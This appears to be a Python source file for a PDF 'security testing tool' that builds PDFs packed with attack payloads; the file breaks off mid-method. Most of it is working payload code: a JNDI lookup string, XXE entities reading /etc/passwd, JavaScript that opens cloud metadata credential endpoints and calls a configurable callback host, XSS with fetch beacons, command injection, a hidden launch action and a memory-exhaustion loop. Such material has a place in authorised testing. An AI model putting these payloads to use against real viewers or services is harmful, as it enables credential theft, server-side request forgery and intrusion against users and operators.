"""
PDF Security Testing Tool
------------------------

This tool generates PDF files containing various security test payloads for evaluating
PDF processing services and viewers. It is intended ONLY for security testing in 
controlled, isolated environments with explicit authorization.

Prerequisites:
- Python 3.7+
- PyPDF2
- reportlab

Installation:
    pip install PyPDF2 reportlab

Usage:
    python pdf_security_tester.py --callback-host your.server.com --callback-port 8080 [--config config.json]

Example config.json:
{
    "enabled_categories": ["metadata", "javascript", "xss"],
    "excluded_payloads": ["Command Injection"],
    "min_severity": "Medium",
    "custom_payloads": [],
    "callback_timeout": 30
}

WARNING: This tool generates PDFs containing potentially hazardous payloads.
Never use this tool against production systems or without proper authorization.

Supported PDF Viewers and Expected Behaviors:
- Adobe Acrobat DC: JavaScript execution, metadata parsing
- PDF.js: Limited JavaScript execution, content rendering
- Chrome PDF Viewer: Content rendering only
- Microsoft Edge PDF Viewer: Content rendering only

Author: [Your Name]
License: [License Info]
"""

import os
import io
import logging
import json
from datetime import datetime
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
import base64
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import argparse
from enum import Enum
import warnings
import sys
from pathlib import Path

class PayloadCategory(Enum):
    """Categories of security test payloads"""
    METADATA = "metadata"
    JAVASCRIPT = "javascript"
    XSS = "xss"
    SSRF = "ssrf"
    FILE_INCLUSION = "file_inclusion"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    HTML_INJECTION = "html_injection"
    TEMPLATE_INJECTION = "template_injection"
    SVG_INJECTION = "svg_injection"
    EMBEDDED_FILES = "embedded_files"
    DIGITAL_SIGNATURES = "digital_signatures"
    PDF_STRUCTURE = "pdf_structure"
    FONT_ATTACKS = "font_attacks"
    XFA_FORMS = "xfa_forms"
    PDF_ACTIONS = "pdf_actions"
    ANNOTATIONS = "annotations"
    LAYERS = "layers"
    ENCRYPTION = "encryption"
    UNICODE = "unicode"

@dataclass
class TestPayload:
    """Represents a security test payload with metadata"""
    name: str
    content: str
    category: PayloadCategory
    description: str
    viewer_requirements: List[str]
    expected_outcome: str
    severity: str
    mitigation: str
    tags: List[str] = None
    references: List[str] = None

class PayloadExecutionError(Exception):
    """Raised when a payload fails to execute"""
    pass

class ConfigurationError(Exception):
    """Raised when there's an issue with the configuration"""
    pass

class PDFSecurityTester:
    def __init__(self, callback_url: str, config: Optional[Dict] = None):
        """
        Initialize the PDF Security Tester
        
        Args:
            callback_url: Base URL for callback tests
            config: Optional configuration dictionary for customizing tests
        """
        self.callback_url = callback_url
        self.test_id = base64.urlsafe_b64encode(os.urandom(6)).decode('ascii')
        self.config = config or {}
        
        # Initialize tracking lists
        self.inserted_payloads: List[TestPayload] = []
        self.execution_log: List[Dict] = []
        self.custom_payloads: List[TestPayload] = []
        self.failed_payloads: List[Tuple[TestPayload, str]] = []
        
        # Set up logging with both file and console handlers
        self.logger = logging.getLogger('PDFSecurityTester')
        self.logger.setLevel(logging.INFO)
        
        # Add console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(console_handler)
        
        # Add file handler
        log_file = f"pdf_security_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(file_handler)
        
        # Log initialization
        self.logger.info(f"Initializing PDF Security Tester with callback URL: {callback_url}")
        
        # Validate configuration
        self._validate_config()
        
        # Load custom payloads if specified
        self._load_custom_payloads()

    def _validate_config(self) -> None:
        """Validate the provided configuration"""
        try:
            if 'enabled_categories' in self.config:
                invalid_categories = set(self.config['enabled_categories']) - {c.value for c in PayloadCategory}
                if invalid_categories:
                    raise ConfigurationError(f"Invalid categories in config: {invalid_categories}")
            
            if 'min_severity' in self.config:
                valid_severities = {'Low', 'Medium', 'High', 'Critical'}
                if self.config['min_severity'] not in valid_severities:
                    raise ConfigurationError(f"Invalid severity level: {self.config['min_severity']}")
            
            if 'callback_timeout' in self.config:
                timeout = self.config['callback_timeout']
                if not isinstance(timeout, (int, float)) or timeout <= 0:
                    raise ConfigurationError("callback_timeout must be a positive number")
                    
        except Exception as e:
            self.logger.error(f"Configuration validation error: {str(e)}")
            raise

    def _load_custom_payloads(self) -> None:
        """Load custom payloads from configuration"""
        if 'custom_payloads' in self.config:
            try:
                for payload_data in self.config['custom_payloads']:
                    if not all(k in payload_data for k in ['name', 'content', 'category']):
                        self.logger.warning(f"Skipping invalid custom payload: {payload_data}")
                        continue
                    
                    try:
                        category = PayloadCategory(payload_data['category'])
                    except ValueError:
                        self.logger.warning(f"Invalid category in custom payload: {payload_data['category']}")
                        continue
                    
                    payload = TestPayload(
                        name=payload_data['name'],
                        content=payload_data['content'],
                        category=category,
                        description=payload_data.get('description', 'Custom payload'),
                        viewer_requirements=payload_data.get('viewer_requirements', ['Unknown']),
                        expected_outcome=payload_data.get('expected_outcome', 'Unknown'),
                        severity=payload_data.get('severity', 'Medium'),
                        mitigation=payload_data.get('mitigation', 'Unknown'),
                        tags=payload_data.get('tags', []),
                        references=payload_data.get('references', [])
                    )
                    
                    self.custom_payloads.append(payload)
                    
            except Exception as e:
                self.logger.error(f"Error loading custom payloads: {str(e)}")

    def _create_in_memory_pdf(self) -> Tuple[canvas.Canvas, io.BytesIO]:
        """Create a PDF in memory"""
        buffer = io.BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        return c, buffer

    def _should_include_payload(self, payload: TestPayload) -> bool:
        """Determine if a payload should be included based on configuration"""
        if not self.config:
            return True
            
        # Check if category is enabled
        if 'enabled_categories' in self.config:
            if payload.category.value not in self.config['enabled_categories']:
                self.logger.debug(f"Skipping payload {payload.name}: category {payload.category.value} not enabled")
                return False
        
        # Check if payload is explicitly excluded
        if 'excluded_payloads' in self.config:
            if payload.name in self.config['excluded_payloads']:
                self.logger.debug(f"Skipping explicitly excluded payload: {payload.name}")
                return False
        
        # Check severity filter
        if 'min_severity' in self.config:
            severity_levels = {'Low': 0, 'Medium': 1, 'High': 2, 'Critical': 3}
            if severity_levels.get(payload.severity, 0) < severity_levels.get(self.config['min_severity'], 0):
                self.logger.debug(f"Skipping payload {payload.name}: severity {payload.severity} below minimum")
                return False
        
        return True

    def _record_payload_execution(self, payload: TestPayload, success: bool, error: Optional[str] = None) -> None:
        """Record the execution status of a payload"""
        import traceback
        
        # Get current stack trace if there's an error
        error_trace = None
        if not success and error:
            error_trace = traceback.format_exc()
        
        status = {
            'timestamp': datetime.now().isoformat(),
            'payload_name': payload.name,
            'category': payload.category.value,
            'success': success,
            'error': error if error else None,
            'error_trace': error_trace,
            'payload_details': {
                'description': payload.description,
                'severity': payload.severity,
                'viewer_requirements': payload.viewer_requirements
            }
        }
        
        self.execution_log.append(status)
        
        if success:
            self.inserted_payloads.append(payload)
        else:
            self.failed_payloads.append((payload, error))
        
        log_level = logging.INFO if success else logging.ERROR
        self.logger.log(log_level, f"Payload {payload.name}: {'Success' if success else f'Failed - {error}'}")
        if error_trace:
            self.logger.debug(f"Error trace for {payload.name}:\n{error_trace}")

    def add_metadata_payloads(self, writer: PdfWriter) -> None:
        """Add metadata-based test payloads"""
        metadata_payloads = [
            TestPayload(
                name="JNDI Injection",
                content=f'${{jndi:ldap://{self.callback_url}/metadata/{self.test_id}}}',
                category=PayloadCategory.METADATA,
                description="Tests JNDI injection via PDF metadata",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May trigger JNDI lookup in vulnerable environments",
                severity="High",
                mitigation="Sanitize metadata fields, disable JNDI lookups"
            ),
            TestPayload(
                name="XXE in Metadata",
                content=f'''<?xml version="1.0"?>
                    <!DOCTYPE data [
                        <!ENTITY file SYSTEM "file:///etc/passwd">
                    ]>
                    <data>&file;</data>''',
                category=PayloadCategory.XXE,
                description="Tests XXE injection via PDF metadata",
                viewer_requirements=["PDF processors with XML parsing"],
                expected_outcome="May read local files if XXE is not disabled",
                severity="High",
                mitigation="Disable XXE in XML parsers, sanitize metadata"
            ),
            TestPayload(
                name="Template Injection Metadata",
                content="${{7*7}} #{7*7} {{7*7}}",
                category=PayloadCategory.TEMPLATE_INJECTION,
                description="Tests various template injection patterns",
                viewer_requirements=["Template processing systems"],
                expected_outcome="May execute template expressions",
                severity="Medium",
                mitigation="Disable template processing for metadata"
            )
        ]
        
        metadata = {}
        for payload in metadata_payloads:
            if self._should_include_payload(payload):
                try:
                    metadata[f'/Test_{payload.name}'] = payload.content
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add metadata payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        writer.add_metadata(metadata)

    def add_javascript_payloads(self, writer: PdfWriter) -> None:
        """Add JavaScript-based test payloads"""
        js_payloads = [
            TestPayload(
                name="Cloud Metadata Access",
                content=self._generate_cloud_metadata_js(),
                category=PayloadCategory.JAVASCRIPT,
                description="Tests access to cloud provider metadata",
                viewer_requirements=["Adobe Acrobat with JavaScript"],
                expected_outcome="May trigger callbacks to metadata endpoints",
                severity="High",
                mitigation="Disable JavaScript execution, implement proper SSRF controls"
            ),
            TestPayload(
                name="File System Access",
                content="""
                try {
                    this.exportDataObject({
                        cName: "test.txt",
                        nLaunch: 2
                    });
                } catch(e) {
                    console.log(e);
                }
                """,
                category=PayloadCategory.JAVASCRIPT,
                description="Tests PDF JavaScript file system access",
                viewer_requirements=["Adobe Acrobat with JavaScript"],
                expected_outcome="May access local file system",
                severity="High",
                mitigation="Disable JavaScript execution"
            )
        ]
        
        for payload in js_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_js(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add JavaScript payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def _generate_cloud_metadata_js(self) -> str:
        """Generate JavaScript for testing cloud metadata access"""
        return f"""
        try {{
            var endpoints = {{
                // AWS Metadata Endpoints
                'aws_metadata': 'http://169.254.169.254/latest/meta-data/',
                'aws_userdata': 'http://169.254.169.254/latest/user-data/',
                'aws_credentials': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                
                // Azure Metadata Endpoints
                'azure_metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'azure_identity': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01',
                'azure_keyvault': 'https://your-vault-name.vault.azure.net/secrets',
                'azure_appservice': 'http://localhost:8081/_framework/debug/ws-proxy',
                'azure_storage': 'http://127.0.0.1:10000/devstoreaccount1',
                
                // GCP Metadata Endpoints
                'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/'
            }};
            
            for (var key in endpoints) {{
                try {{
                    app.launchURL(endpoints[key]);
                    app.launchURL('{self.callback_url}/js/' + key + '/{self.test_id}');
                }} catch (e) {{
                    console.log('Error testing endpoint ' + key + ': ' + e.message);
                }}
            }}
        }} catch (e) {{
            console.log('Main JavaScript error: ' + e.message);
        }}
        """

    def _create_xss_test_page(self) -> io.BytesIO:
        """Create a page with XSS test payloads"""
        c, buffer = self._create_in_memory_pdf()
        
        xss_payloads = [
            TestPayload(
                name="Basic XSS",
                content='<script>alert(document.domain)</script>',
                category=PayloadCategory.XSS,
                description="Basic XSS test",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May execute JavaScript in vulnerable viewers",
                severity="High",
                mitigation="Sanitize rendered content, disable JavaScript"
            ),
            TestPayload(
                name="SVG XSS",
                content=f'''<svg>
                    <script>
                        fetch("{self.callback_url}/xss/svg/{self.test_id}")
                    </script>
                </svg>''',
                category=PayloadCategory.XSS,
                description="SVG-based XSS test",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May execute JavaScript via SVG",
                severity="High",
                mitigation="Sanitize SVG content, disable JavaScript"
            )
        ]
        
        y_pos = 750
        for payload in xss_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 30
                except Exception as e:
                    self.logger.error(f"Failed to add XSS payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        return buffer

    def _create_injection_test_page(self) -> io.BytesIO:
        """Create a page with various injection tests"""
        c, buffer = self._create_in_memory_pdf()
        
        injection_payloads = [
            TestPayload(
                name="Template Injection",
                content="{{7*7}}",
                category=PayloadCategory.TEMPLATE_INJECTION,
                description="Tests for template injection vulnerabilities",
                viewer_requirements=["Any"],
                expected_outcome="May be evaluated by template engines",
                severity="Medium",
                mitigation="Disable template processing for PDF content"
            ),
            TestPayload(
                name="Command Injection",
                content="$(cat /etc/passwd)",
                category=PayloadCategory.COMMAND_INJECTION,
                description="Tests for command injection via PDF content",
                viewer_requirements=["PDF processors with command execution"],
                expected_outcome="May execute shell commands if improperly handled",
                severity="High",
                mitigation="Sanitize input, disable command execution"
            ),
            TestPayload(
                name="XXE Injection",
                content=f'''<?xml version="1.0"?>
                    <!DOCTYPE test [
                        <!ENTITY % file SYSTEM "file:///etc/passwd">
                        <!ENTITY % dtd SYSTEM "http://{self.callback_url}/xxe/{self.test_id}">
                        %dtd;
                    ]>''',
                category=PayloadCategory.XXE,
                description="Tests for XXE injection vulnerabilities",
                viewer_requirements=["PDF processors with XML parsing"],
                expected_outcome="May read local files or make network requests",
                severity="High",
                mitigation="Disable XXE in XML parsers"
            )
        ]
        
        y_pos = 750
        for payload in injection_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 30
                except Exception as e:
                    self.logger.error(f"Failed to add injection payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        return buffer

    def _render_rich_content(self, canvas_obj: canvas.Canvas, content: str, x: int, y: int) -> None:
        """
        Render rich content (HTML/SVG) appropriately in the PDF
        
        Args:
            canvas_obj: ReportLab canvas object
            content: Content to render
            x: X coordinate
            y: Y coordinate
        """
        from reportlab.platypus import Paragraph
        from reportlab.lib.styles import ParagraphStyle
        
        # Create a basic style for rich text
        style = ParagraphStyle(
            'default',
            fontName='Helvetica',
            fontSize=10,
            leading=12,
            spaceAfter=10
        )
        
        # Create paragraph object
        p = Paragraph(content, style)
        
        # Get required space
        w, h = p.wrap(500, 1000)  # Max width of 500 points
        
        # Draw the content
        p.drawOn(canvas_obj, x, y - h)
        
        return y - h  # Return new Y position

    def _create_render_test_page(self) -> io.BytesIO:
        """Create a page with rendering-based tests"""
        c, buffer = self._create_in_memory_pdf()
        
        render_payloads = [
            TestPayload(
                name="SVG with External Entity",
                content=f'''
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                    <image href="file:///etc/passwd" x="0" y="0" height="100" width="100"/>
                    <image href="{self.callback_url}/svg/image/{self.test_id}" x="0" y="0" height="100" width="100"/>
                </svg>''',
                category=PayloadCategory.SVG_INJECTION,
                description="Tests SVG external entity handling",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May load external resources or local files",
                severity="High",
                mitigation="Sanitize SVG content, disable external references"
            ),
            TestPayload(
                name="HTML Injection",
                content=f'''
                <html>
                    <body>
                        <img src="{self.callback_url}/html/img/{self.test_id}" />
                        <iframe src="file:///etc/passwd"></iframe>
                    </body>
                </html>''',
                category=PayloadCategory.HTML_INJECTION,
                description="Tests HTML content handling",
                viewer_requirements=["PDF viewers with HTML support"],
                expected_outcome="May render HTML and load resources",
                severity="High",
                mitigation="Sanitize HTML content, disable external resources"
            )
        ]
        
        y_pos = 750
        for payload in render_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 50
                except Exception as e:
                    self.logger.error(f"Failed to add render payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        return buffer

    def _add_test_pages(self, writer: PdfWriter) -> None:
        """Add all test pages to the PDF"""
        test_pages = [
            self._create_xss_test_page(),
            self._create_injection_test_page(),
            self._create_render_test_page()
        ]
        
        for page_buffer in test_pages:
            try:
                page_buffer.seek(0)
                reader = PdfReader(page_buffer)
                writer.add_page(reader.pages[0])
            except Exception as e:
                self.logger.error(f"Error adding test page: {str(e)}")

    def add_embedded_file_payloads(self, writer: PdfWriter) -> None:
        """Add embedded file-based test payloads"""
        embedded_payloads = [
            TestPayload(
                name="Executable Attachment",
                content="TVqQAAMAAAAEAAAA//8AALgAAAA...",  # Fake executable header
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests handling of executable file attachments",
                viewer_requirements=["PDF processors with attachment handling"],
                expected_outcome="Should be blocked or sanitized",
                severity="High",
                mitigation="Block executable attachments"
            ),
            TestPayload(
                name="Nested PDF",
                content="%PDF-1.7\n%¿÷¢\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n%%EOF",
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests handling of nested PDF files",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should be detected and analyzed",
                severity="Medium",
                mitigation="Scan nested PDFs"
            ),
            TestPayload(
                name="Hidden JavaScript",
                content="app.alert('Hidden JS execution');",
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests execution of hidden JavaScript files",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="JavaScript execution from attachment",
                severity="High",
                mitigation="Disable JavaScript in attachments"
            )
        ]
        
        for payload in embedded_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addAttachment(f"test_{payload.name}", payload.content.encode())
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add embedded payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_signature_payloads(self, writer: PdfWriter) -> None:
        """Add digital signature-based test payloads"""
        signature_payloads = [
            TestPayload(
                name="Invalid Signature",
                content="""
                    /Type /Sig
                    /Filter /Adobe.PPKLite
                    /SubFilter /adbe.pkcs7.detached
                    /Name (Invalid Test Signature)
                    /ByteRange [0 1000000]
                    /Contents <1234>
                """,
                category=PayloadCategory.DIGITAL_SIGNATURES,
                description="Tests handling of invalid signatures",
                viewer_requirements=["PDF processors with signature validation"],
                expected_outcome="Should detect invalid signature",
                severity="Medium",
                mitigation="Properly validate signatures"
            )
        ]
        
        for payload in signature_payloads:
            if self._should_include_payload(payload):
                try:
                    # Add signature dictionary to PDF
                    writer.addObject(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add signature payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_structure_payloads(self, writer: PdfWriter) -> None:
        """Add PDF structure-based test payloads"""
        structure_payloads = [
            TestPayload(
                name="Malformed XRef",
                content="0 0 obj\n<<>>\nstream\n" + ("A" * 1000) + "\nendstream\nendobj\n",
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of malformed PDF structure",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should handle gracefully",
                severity="Medium",
                mitigation="Validate PDF structure"
            ),
            TestPayload(
                name="Invalid Object Stream",
                content="1 0 obj\n<</Length 9999999999>>\nstream\n",
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of invalid object streams",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect invalid length",
                severity="Medium",
                mitigation="Validate object streams"
            )
        ]
        
        for payload in structure_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addObject(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def _add_pdf_object(self, writer: PdfWriter, content: str | bytes | dict[str, Any]) -> None:
        """Add a PDF object to the document using PyPDF2 3.0+ API"""
        from PyPDF2.generic import (
            DictionaryObject, 
            NameObject, 
            TextStringObject,
            StreamObject,
            ArrayObject,
            NumberObject,
            BooleanObject
        )
        
        try:
            if isinstance(content, (str, bytes)):
                if isinstance(content, str):
                    content = content.strip()
                    if content.startswith('<<') and content.endswith('>>'):
                        # Parse dictionary format
                        obj = DictionaryObject()
                        # Basic parser for PDF dictionary syntax
                        content = content[2:-2].strip()
                        parts = content.split('/')
                        for part in parts[1:]:  # Skip empty first part
                            if not part.strip():
                                continue
                            key_value = part.strip().split(' ', 1)
                            if len(key_value) == 2:
                                key, value = key_value
                                # Handle different value types
                                if value.startswith('(') and value.endswith(')'):
                                    value = TextStringObject(value[1:-1])
                                elif value.startswith('[') and value.endswith(']'):
                                    value = ArrayObject([NumberObject(x) for x in value[1:-1].split()])
                                elif value.lower() in ('true', 'false'):
                                    value = BooleanObject(value.lower() == 'true')
                                else:
                                    try:
                                        value = NumberObject(float(value))
                                    except ValueError:
                                        value = TextStringObject(value)
                                obj[NameObject('/' + key)] = value
                        
                        writer._add_object(obj)
                    else:
                        # Add as stream
                        stream = StreamObject()
                        stream._data = content.encode() if isinstance(content, str) else content
                        writer._add_object(stream)
                else:
                    # Binary content
                    stream = StreamObject()
                    stream._data = content
                    writer._add_object(stream)
            elif isinstance(content, dict):
                # Handle dictionary input
                obj = DictionaryObject()
                for key, value in content.items():
                    if not key.startswith('/'):
                        key = '/' + key
                    obj[NameObject(key)] = TextStringObject(str(value))
                writer._add_object(obj)
        except Exception as e:
            raise ValueError(f"Failed to add PDF object: {str(e)}")

    def add_font_payloads(self, writer: PdfWriter) -> None:
        """Add font-based test payloads"""
        font_payloads = [
            TestPayload(
                name="Malicious Font",
                content={
                    'Type': '/Font',
                    'Subtype': '/Type1',
                    'BaseFont': '/' + ('A' * 1000),  # Long font name
                    'Encoding': {
                        'Type': '/Encoding',
                        'Differences': [1, '/a', '/b', '/c' * 1000]  # Large differences array
                    }
                },
                category=PayloadCategory.FONT_ATTACKS,
                description="Tests font handling",
                viewer_requirements=["PDF processors with font support"],
                expected_outcome="Should handle malformed fonts",
                severity="High",
                mitigation="Validate font objects"
            )
        ]
        
        for payload in font_payloads:
            if self._should_include_payload(payload):
                try:
                    self._add_pdf_object(writer, payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add font payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_form_payloads(self, writer: PdfWriter) -> None:
        """Add XFA form-based test payloads"""
        xfa_template = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
            <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
                <script contentType="application/x-javascript">
                    app.alert('XFA Execution');
                    app.launchURL("{self.callback_url}/xfa/{self.test_id}");
                </script>
            </template>
        </xdp:xdp>
        """
        
        form_payloads = [
            TestPayload(
                name="XFA Form",
                content=xfa_template,
                category=PayloadCategory.XFA_FORMS,
                description="Tests XFA form processing",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript via XFA",
                severity="High",
                mitigation="Disable XFA processing"
            )
        ]
        
        for payload in form_payloads:
            if self._should_include_payload(payload):
                try:
                    # Add XFA form template
                    writer.addObject(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add form payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_annotation_payloads(self, writer: PdfWriter) -> None:
        """Add annotation-based test payloads"""
        annotation_payloads = [
            TestPayload(
                name="JavaScript Annotation",
                content=f"""
                <<
                    /Type /Annot
                    /Subtype /Link
                    /Rect [0 0 100 100]
                    /A <<
                        /S /JavaScript
                        /JS (app.launchURL("{self.callback_url}/annot/{self.test_id}");)
                    >>
                >>
                """,
                category=PayloadCategory.ANNOTATIONS,
                description="Tests JavaScript in annotations",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript",
                severity="Medium",
                mitigation="Disable annotation scripts"
            )
        ]
        
        for payload in annotation_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addObject(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_advanced_javascript_payloads(self, writer: PdfWriter) -> None:
        """Add advanced JavaScript execution tests"""
        js_payloads = [
            TestPayload(
                name="Hidden Layer JavaScript",
                content=f"""
                    var layer = this.addLayer("HiddenLayer");
                    layer.enabled = false;
                    layer.onClick = function() {{
                        app.launchURL("{self.callback_url}/layer/{self.test_id}");
                    }};
                """,
                category=PayloadCategory.JAVASCRIPT,
                description="Tests JavaScript execution in hidden layers",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript when layer is toggled",
                severity="High",
                mitigation="Disable JavaScript in layers"
            ),
            TestPayload(
                name="Resource Exhaustion",
                content="""
                    var arr = [];
                    while(true) {
                        arr.push(new Array(1000000).join('A'));
                    }
                """,
                category=PayloadCategory.JAVASCRIPT,
                description="Tests memory exhaustion protection",
                viewer_requirements=["PDF processors with JavaScript"],
                expected_outcome="Should be prevented by memory limits",
                severity="High",
                mitigation="Implement JavaScript resource limits"
            ),
            TestPayload(
                name="DOM-Based XSS",
                content=f"""
                    var url = app.media.getURLData();
                    var decoded = decodeURIComponent(url);
                    app.alert(decoded);
                    app.launchURL("{self.callback_url}/xss/dom/" + decoded);
                """,
                category=PayloadCategory.XSS,
                description="Tests DOM-based XSS in PDF viewers",
                viewer_requirements=["PDF viewers with DOM access"],
                expected_outcome="May execute XSS via URL parameters",
                severity="High",
                mitigation="Sanitize URL parameters"
            )
        ]
        
        for payload in js_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_js(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add advanced JS payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_resource_exhaustion_tests(self, writer: PdfWriter) -> None:
        """Add tests for resource exhaustion vulnerabilities"""
        # Create a PDF with extremely large dimensions
        large_page = writer.add_blank_page(width=100000, height=100000)
        
        # Add a massive number of small objects
        for i in range(1000):
            writer.add_object(f"% Comment {i}\n" * 1000)
        
        # Add deeply nested dictionaries
        nested_dict = "<<\n"
        for i in range(1000):
            nested_dict += f"/Key{i} <<\n"
        nested_dict += ">>" * 1000
        writer.add_object(nested_dict)

    def add_malformed_structure_payloads(self, writer: PdfWriter) -> None:
        """Add tests for malformed PDF structures"""
        structure_payloads = [
            TestPayload(
                name="Overlapping Objects",
                content="""
                1 0 obj
                <<>>
                endobj
                1 0 obj
                <<>>
                endobj
                """,
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of overlapping object numbers",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect and reject duplicate objects",
                severity="High",
                mitigation="Validate object numbering"
            ),
            TestPayload(
                name="Circular References",
                content="""
                1 0 obj
                <<
                    /Type /Pages
                    /Kids [2 0 R]
                >>
                endobj
                2 0 obj
                <<
                    /Parent 1 0 R
                    /Kids [1 0 R]
                >>
                endobj
                """,
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of circular object references",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect circular references",
                severity="High",
                mitigation="Check for circular references"
            )
        ]
        
        for payload in structure_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addObject(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_advanced_annotation_payloads(self, writer: PdfWriter) -> None:
        """Add advanced annotation-based test payloads"""
        annotation_payloads = [
            TestPayload(
                name="Hidden Launch Action",
                content=f"""
                <<
                    /Type /Annot
                    /Subtype /Link
                    /Rect [0 0 0 0]
                    /F 2
                    /A <<
                        /Type /Action
                        /S /Launch
                        /F (calc.exe)
                    >>
                >>
                """,
                category=PayloadCategory.ANNOTATIONS,
                description="Tests hidden annotations with launch actions",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="Should block launch actions",
                severity="Critical",
                mitigation="Disable launch actions"
            ),
            TestPayload(
                name="Dynamic Annotation",
                content=f"""
                <<
                    /Type /Annot
                    /Subtype /Widget
                    /FT /Tx
                    /AA <<
                        /K <<
                            /S /JavaScript
                            /JS (app.launchURL("{self.callback_url}/annot/dynamic/{self.test_id}");)
                        >>
                    >>
                >>
                """,
                category=PayloadCategory.ANNOTATIONS,
                description="Tests dynamic annotation behaviors",
                viewer_requirements=["PDF viewers with annotation support"],
                expected_outcome="May execute JavaScript on interaction",
                severity="High",
                mitigation="Disable annotation scripts"
            )
        ]
        
        for payload in annotation_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.addObject(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def create_security_test_pdf(self, output_path: str) -> None:
        """
        Create a PDF with security test payloads
        
        Args:
            output_path: Where to save the final PDF
        """
        writer = PdfWriter()
        successful_payloads = 0
        failed_payloads = 0
        
        try:
            # Add basic tests
            test_methods = [
                self.add_metadata_payloads,
                self.add_javascript_payloads,
                self._add_test_pages,
                self.add_embedded_file_payloads,
                self.add_signature_payloads,
                self.add_structure_payloads,
                self.add_font_payloads,
                self.add_form_payloads,
                self.add_annotation_payloads,
                # New advanced tests
                self.add_advanced_javascript_payloads,
                self.add_advanced_annotation_payloads,
                self.add_malformed_structure_payloads
            ]
            
